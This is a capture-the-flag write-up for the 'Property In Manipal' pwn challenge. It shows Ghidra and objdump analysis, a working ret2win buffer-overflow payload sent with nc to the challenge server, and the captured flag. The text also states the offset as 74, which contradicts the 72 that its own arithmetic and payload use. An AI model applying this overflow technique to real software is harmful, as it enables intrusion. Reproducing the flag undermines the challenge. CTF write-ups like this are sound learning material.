
# 3. Property In Manipal

## Solution:

Opening the program in ghidra and having a look at the main function we can see that it just prints some text and calls vuln() function.

vuln() function is where ther vulnerability lies `printf(local_48);` has no format specifier and `gets(local_48);` is vulnerable to buffer overflow.

We find the win() address,
```
cookorcooked@ubuntu25:~/Desktop/Curated/property_in_manipal/src$ nm manipal | grep win
0000000000401196 T win
```
We can calculate the the offset again 64 bytes for the buffer, 8 bytes for the base pointer of pervious function and the next 8 bytes should be the return address. So offset is 74.

But when I tried this the program crashed, which indicated a stack alignment issue, which can be fixed by using a ret instruction.

```
cookorcooked@ubuntu25:~/Desktop/Curated/property_in_manipal/src$ objdump -d manipal | grep -i "ret" | head
  40101a:	c3                   	ret
  4010e4:	c3                   	ret
  401110:	c3                   	ret
  401158:	c3                   	ret
  40117e:	c3                   	ret
  401180:	c3                   	ret
  4011ab:	c3                   	ret
  40124d:	c3                   	ret
  4012cb:	c3                   	ret
  4012d8:	c3                   	ret
```

Now that we have everything, the offset, ret instruction and the win address, we can craft the payload.

Using the payload `( echo AAAA; sleep 1; perl -e 'print "A"x72 . "\x1a\x10\x40\x00\x00\x00\x00\x00" . "\x96\x11\x40\x00\x00\x00\x00\x00" . "\n"' )` we can get the flag.

```
cookorcooked@ubuntu25:~/Desktop/Curated/property_in_manipal/src$ ( echo AAAA; sleep 1; perl -e 'print "A"x72 . "\x1a\x10\x40\x00\x00\x00\x00\x00" . "\x96\x11\x40\x00\x00\x00\x00\x00" . "\n"' ) | nc propertyinmanipal.nitephase.live 42586
I bought a property in Mandavi
& what they do for you is,
they give you the property.
Enter your name to signup for the property: Hello, AAAA

Enter the amount for customizations: nite{ch0pp3d_ch1n_r34lly_m4d3_2025_p34k_f0r_u5}

```


## Flag:

```
nite{ch0pp3d_ch1n_r34lly_m4d3_2025_p34k_f0r_u5}
```

## Concepts learnt:

- Learnt how to use buffer overflow to manipulate program while tackling with issues like improper stack alignment.

## Notes:

- NONE
  
## Resources:

- NONE

***

